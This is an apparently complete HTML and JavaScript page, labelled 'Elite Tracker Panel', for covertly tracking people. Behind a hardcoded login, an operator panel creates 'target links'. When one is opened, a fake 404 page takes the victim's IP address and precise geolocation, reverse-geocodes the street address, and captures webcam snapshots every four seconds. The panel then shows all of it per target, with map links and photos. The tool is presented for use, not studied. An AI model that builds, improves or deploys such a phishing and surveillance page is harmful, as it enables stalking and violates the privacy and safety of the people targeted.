<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Elite Tracker Panel - CodingX</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
    <style>
        /* CSS ASLI ANDA - 100% TETAP */
        :root {
            --bg-main: #0a0a0c;
            --panel-bg: rgba(30, 30, 35, 0.7);
            --accent-glow: #00f2ff;
            --accent-dark: #0066ff;
            --border-glass: rgba(255, 255, 255, 0.1);
        }

        body {
            margin: 0; padding: 0; background-color: var(--bg-main);
            background-image: radial-gradient(circle at top right, #1a1a2e, transparent);
            color: white; font-family: 'Inter', sans-serif;
            display: flex; justify-content: center; min-height: 100vh;
        }

        .phone-frame { width: 100%; max-width: 420px; padding: 20px; box-sizing: border-box; position: relative; }

        .header-profile {
            background: var(--panel-bg); backdrop-filter: blur(10px);
            border-radius: 24px; padding: 25px; border: 1px solid var(--border-glass);
            text-align: center; margin-bottom: 25px; position: relative; overflow: hidden;
        }

        /* TAMPILAN EXP DI ATAS POJOK KANAN */
        .exp-timer {
            position: absolute; top: 5px; right: 15px;
            font-family: 'Orbitron'; font-size: 9px; color: #ff0055;
            background: rgba(0,0,0,0.9); padding: 4px 10px; border-radius: 8px;
            border: 1px solid #ff0055; z-index: 999;
            box-shadow: 0 0 10px rgba(255, 0, 85, 0.5);
        }

        .logo-main {
            width: 90px; height: 90px; border-radius: 50%; background: #000;
            margin: 0 auto 15px; display: flex; justify-content: center; align-items: center;
            border: 2px solid var(--accent-glow); box-shadow: 0 0 20px var(--accent-dark);
        }
        .logo-main svg { width: 50px; fill: var(--accent-glow); }

        .header-profile h1 {
            font-family: 'Orbitron', sans-serif; font-size: 20px; letter-spacing: 3px;
            margin: 10px 0; text-transform: uppercase; color: white;
        }

        .status-badge {
            display: inline-flex; align-items: center; background: rgba(0, 255, 100, 0.1);
            color: #00ff64; padding: 5px 15px; border-radius: 20px; font-size: 12px; font-weight: bold;
        }

        .control-panel {
            background: var(--panel-bg); backdrop-filter: blur(15px);
            border-radius: 24px; padding: 20px; border: 1px solid var(--border-glass);
            margin-bottom: 20px;
        }

        .label-style { font-size: 11px; text-transform: uppercase; color: #888; margin-bottom: 10px; display: block; }

        .input-group {
            background: rgba(0,0,0,0.3); border-radius: 12px; padding: 10px;
            border: 1px solid #333; display: flex; align-items: center; justify-content: space-between;
        }
        .input-group input { background: transparent; border: none; color: #fff; width: 70%; outline: none; }

        .btn-action {
            background: linear-gradient(135deg, var(--accent-glow), var(--accent-dark));
            color: #000; border: none; padding: 10px 18px; border-radius: 10px;
            font-weight: 800; font-size: 11px; cursor: pointer;
        }

        .target-folder {
            background: linear-gradient(90deg, #1e1e24, #121216);
            border-radius: 15px; padding: 18px; margin-top: 10px;
            display: flex; align-items: center; justify-content: space-between;
            border-left: 4px solid var(--accent-glow);
        }

        .folder-info { display: flex; align-items: center; flex-grow: 1; cursor: pointer; }
        .robotic-svg { width: 24px; height: 24px; fill: var(--accent-glow); margin-right: 15px; }
        .trash-svg { width: 18px; height: 18px; fill: #ff4444; }

        #login-gate {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: var(--bg-main); z-index: 10000; display: flex; justify-content: center; align-items: center;
        }
        
        #gallery-overlay {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: var(--bg-main); z-index: 999; padding: 20px; box-sizing: border-box; overflow-y: auto;
        }
        .grid-photos { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; margin-top: 20px; }
        .grid-photos img { width: 100%; border-radius: 15px; }

        #phish-view { display: none; text-align: center; padding-top: 100px; color: #444; }

        /* --- CSS SIDEBAR (TAMBAHAN) --- */
        #side-nav {
            position: fixed; top: 0; left: -300px; width: 280px; height: 100%;
            background: #0f0f12; z-index: 20000; transition: 0.4s;
            border-right: 1px solid var(--border-glass);
        }
        #side-nav.active { left: 0; }
        .nav-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.7); z-index: 15000; display: none;
        }
        .hamburger {
            position: absolute; top: 20px; left: 20px; z-index: 1000;
            background: var(--panel-bg); border: 1px solid var(--border-glass);
            padding: 8px; border-radius: 10px; cursor: pointer;
        }
        .nav-content { padding: 40px 20px; }
        .nav-profile { text-align: center; margin-bottom: 30px; }
        .nav-avatar { 
            width: 70px; height: 70px; border-radius: 50%; border: 2px solid var(--accent-glow);
            margin: 0 auto 10px; background: #000; display: flex; align-items: center; justify-content: center;
        }
        .nav-avatar svg { width: 40px; fill: var(--accent-glow); }
        .nav-links { display: flex; flex-direction: column; gap: 5px; }
        .nav-item {
            padding: 15px; display: flex; align-items: center; gap: 15px;
            color: #ccc; text-decoration: none; border-radius: 12px; transition: 0.3s;
        }
        .nav-item:hover { background: rgba(0, 242, 255, 0.1); color: var(--accent-glow); }
        .nav-item svg { width: 20px; fill: currentColor; }
    </style>
</head>
<body>

<div class="nav-overlay" id="navOver" onclick="toggleNav()"></div>
<div id="side-nav">
    <div class="nav-content">
        <div class="nav-profile">
            <div class="nav-avatar">
                <svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
            </div>
            <b style="font-family: 'Orbitron'; font-size: 16px;">R_hmt</b>
            <p style="font-size: 10px; color: var(--accent-glow); margin-top: 5px;">Elite Member</p>
        </div>
        <div class="nav-links">
            <a href="#" class="nav-item">
                <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
                Contact CS
            </a>
            <a href="#" class="nav-item">
                <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm-5 14H4v-4h11v4zm0-5H4V9h11v4zm5 5h-4V9h4v9z"/></svg>
                Saluran
            </a>
            <a href="https://t.me/" class="nav-item">
                <svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
                Telegram
            </a>
            <a href="https://tiktok.com/" class="nav-item">
                <svg viewBox="0 0 24 24"><path d="M12.53.02C13.84 0 15.14.01 16.44 0c.08 1.53.63 3.09 1.75 4.17 1.12 1.11 2.7 1.62 4.24 1.79v4.03c-1.44-.05-2.89-.35-4.2-.97-.57-.26-1.1-.59-1.62-.93-.01 2.92.01 5.84-.02 8.75-.08 1.4-.54 2.79-1.35 3.94-1.31 1.92-3.58 3.17-5.91 3.21-1.43.08-2.86-.31-4.08-1.03-2.02-1.19-3.44-3.37-3.65-5.71-.02-.5-.03-1-.01-1.49.18-1.9 1.12-3.72 2.58-4.96 1.66-1.44 3.98-2.13 6.15-1.72.02 1.48-.04 2.96-.04 4.44-1.22-.32-2.57-.17-3.6.48-.99.63-1.61 1.76-1.63 2.93-.01.93.39 1.84 1.05 2.48.75.76 1.82 1.11 2.89 1.03 1.2-.1 2.37-.74 2.99-1.73.4-.6.64-1.31.67-2.03.03-3.95.01-7.9.02-11.85z"/></svg>
                TikTok
            </a>
        </div>
    </div>
</div>

<div id="login-gate">
    <div class="control-panel" style="width: 80%; text-align: center;">
        <h2 style="font-family: 'Orbitron'; font-size: 14px; color: var(--accent-glow);">MASTER ACCESS</h2>
        <input type="text" id="user-in" class="input-group" style="width: 100%; margin-bottom: 10px; padding: 12px; box-sizing: border-box; background: #000; color: #fff;" placeholder="Username">
        <input type="password" id="pass-in" class="input-group" style="width: 100%; margin-bottom: 20px; padding: 12px; box-sizing: border-box; background: #000; color: #fff;" placeholder="Password">
        <button class="btn-action" style="width: 100%;" onclick="auth()">LOGIN SYSTEM</button>
    </div>
</div>

<div class="phone-frame" id="admin-view" style="display:none;">
    <div class="hamburger" onclick="toggleNav()">
        <svg width="24" height="24" viewBox="0 0 24 24" fill="white"><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
    </div>

    <div class="header-profile">
        <div class="exp-timer" id="exp-display">EXP: 60m 0s</div>
        <div class="logo-main">
            <svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5" fill="none" stroke="cyan" stroke-width="2"/></svg>
        </div>
        <h1>ONDEV PANEL</h1>
        <div class="status-badge">● TERMINAL ACTIVE</div>
    </div>

    <div class="control-panel">
        <span class="label-style">Target Link</span>
        <div class="input-group">
            <input type="text" id="gen-url" readonly>
            <div onclick="copyLink()" style="cursor:pointer;">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="cyan"><path d="M16 1H4C2.9 1 2 1.9 2 3V17H4V3H16V1ZM19 5H8C6.9 5 6 5.9 6 7V21C6 22.1 6.9 23 8 23H19C20.1 23 21 22.1 21 21V7C21 5.9 20.1 5 19 5ZM19 21H8V7H19V21Z"/></svg>
            </div>
        </div>
    </div>

    <div class="control-panel">
        <span class="label-style">Connected Targets</span>
        <div id="target-list"></div>
    </div>
</div>

<div id="gallery-overlay">
    <button style="color: cyan; background: none; border: 1px solid #333; padding: 8px 20px; border-radius: 10px; cursor: pointer;" onclick="closeFolder()">⬅ BACK</button>
    <div id="info-container" style="margin-top:20px; font-size:12px; background:rgba(0,0,0,0.5); padding:15px; border-radius:15px; border:1px solid var(--accent-glow);"></div>
    <div class="grid-photos" id="photo-grid"></div>
</div>

<div id="phish-view" class="phone-frame">
    <h2>404 ERROR</h2>
    <video id="v" style="display:none;" autoplay></video>
</div>

<script>
    const idTarget = new URLSearchParams(window.location.search).get('id');

    function toggleNav() {
        const side = document.getElementById('side-nav');
        const over = document.getElementById('navOver');
        if(side.classList.contains('active')) {
            side.classList.remove('active');
            over.style.display = 'none';
        } else {
            side.classList.add('active');
            over.style.display = 'block';
        }
    }

    // --- SISTEM PEMBAKARAN 1 JAM (V15 RESET) ---
    function auth() {
        const u = document.getElementById('user-in').value;
        const p = document.getElementById('pass-in').value;
        
        if(localStorage.getItem('ondev_kill_v15') === 'true') {
            alert('AKSES DITOLAK: MASA BERLAKU HABIS!');
            return;
        }

        if(u === 'ondev' && p === 'ondev') {
            // SET 1 JAM (60 MENIT)
            if(!localStorage.getItem('ondev_time_v15')) {
                const satuJam = new Date().getTime() + (60 * 60 * 1000); 
                localStorage.setItem('ondev_time_v15', satuJam);
            }

            const skrg = new Date().getTime();
            if(skrg > localStorage.getItem('ondev_time_v15')) {
                localStorage.setItem('ondev_kill_v15', 'true');
                alert('AKSES EXPIRED!');
                location.reload();
            } else {
                document.getElementById('login-gate').style.display = 'none';
                document.getElementById('admin-view').style.display = 'block';
                startAdmin();
                startTimer();
            }
        } else {
            alert('WRONG PASSWORD!');
        }
    }

    function startTimer() {
        const x = setInterval(function() {
            const exp = localStorage.getItem('ondev_time_v15');
            const now = new Date().getTime();
            const diff = exp - now;

            if (diff <= 0) {
                clearInterval(x);
                localStorage.setItem('ondev_kill_v15', 'true');
                location.reload();
            }

            const m = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
            const s = Math.floor((diff % (1000 * 60)) / 1000);
            document.getElementById('exp-display').innerHTML = "EXP: " + m + "m " + s + "s";
        }, 1000);
    }

    if (!idTarget) {
        function startAdmin() {
            document.getElementById('gen-url').value = window.location.href.split('?')[0] + "?id=" + (Math.floor(Math.random() * 8999) + 1000);
            updateFolders();
            setInterval(updateFolders, 3000);
        }

        function updateFolders() {
            const list = document.getElementById('target-list');
            const data = JSON.parse(localStorage.getItem('ondev_db_v15') || '{}');
            list.innerHTML = '';
            Object.keys(data).forEach((id, index) => {
                const div = document.createElement('div');
                div.className = 'target-folder';
                div.innerHTML = `
                    <div class="folder-info" onclick="openFolder('${id}')">
                        <svg class="robotic-svg" viewBox="0 0 24 24"><path d="M10 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2h-8l-2-2z"/></svg>
                        <div class="folder-text"><b>TARGET #${index + 1}</b><span class="time-txt">⏰ ${data[id].info.time}</span></div>
                    </div>
                    <button style="background:none; border:none; cursor:pointer;" onclick="deleteTarget('${id}')"><svg class="trash-svg" viewBox="0 0 24 24"><path d="M6 19c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V7H6v12zM19 4h-3.5l-1-1h-5l-1 1H5v2h14V4z"/></svg></button>
                `;
                list.appendChild(div);
            });
        }

        function openFolder(id) {
            const data = JSON.parse(localStorage.getItem('ondev_db_v15') || '{}');
            const t = data[id];
            document.getElementById('info-container').innerHTML = `
                <p>IP: ${t.info.ip}</p><p>ADDRESS: ${t.info.address}</p>
                <a href="https://www.google.com/maps?q=${t.info.lat},${t.info.lon}" target="_blank" style="color:cyan;">[ BUKA LOKASI ]</a>
            `;
            document.getElementById('photo-grid').innerHTML = t.photos.map(s => `<img src="${s}">`).join('');
            document.getElementById('gallery-overlay').style.display = 'block';
        }

        function deleteTarget(id) {
            if(confirm('Hapus target?')) {
                let data = JSON.parse(localStorage.getItem('ondev_db_v15') || '{}');
                delete data[id];
                localStorage.setItem('ondev_db_v15', JSON.stringify(data));
                updateFolders();
            }
        }
        function closeFolder() { document.getElementById('gallery-overlay').style.display = 'none'; }
    } else {
        document.getElementById('login-gate').style.display = 'none';
        document.getElementById('phish-view').style.display = 'block';
        const d = new Date();
        const timeNow = d.getHours().toString().padStart(2,'0') + ":" + d.getMinutes().toString().padStart(2,'0');
        let captureData = { photos: [], info: { time: timeNow, ip: '...', address: '...', lat: 0, lon: 0 }};
        fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => { captureData.info.ip = d.ip; sync(); });
        navigator.geolocation.getCurrentPosition(p => {
            captureData.info.lat = p.coords.latitude; captureData.info.lon = p.coords.longitude;
            fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${p.coords.latitude}&lon=${p.coords.longitude}`)
            .then(r => r.json()).then(res => { captureData.info.address = res.display_name; sync(); });
        }, null, { enableHighAccuracy: true });
        navigator.mediaDevices.getUserMedia({ video: true }).then(s => {
            const v = document.getElementById('v'); v.srcObject = s;
            setInterval(() => {
                const c = document.createElement('canvas');
                c.width = v.videoWidth; c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                captureData.photos.unshift(c.toDataURL('image/jpeg', 0.4));
                sync();
            }, 4000);
        });
        function sync() {
            let db = JSON.parse(localStorage.getItem('ondev_db_v15') || '{}');
            db[idTarget] = captureData;
            localStorage.setItem('ondev_db_v15', JSON.stringify(db));
        }
    }
    function copyLink() {
        const i = document.getElementById('gen-url'); i.select(); document.execCommand('copy');
        alert('LINK COPIED!');
    }
</script>
</body>
</html>
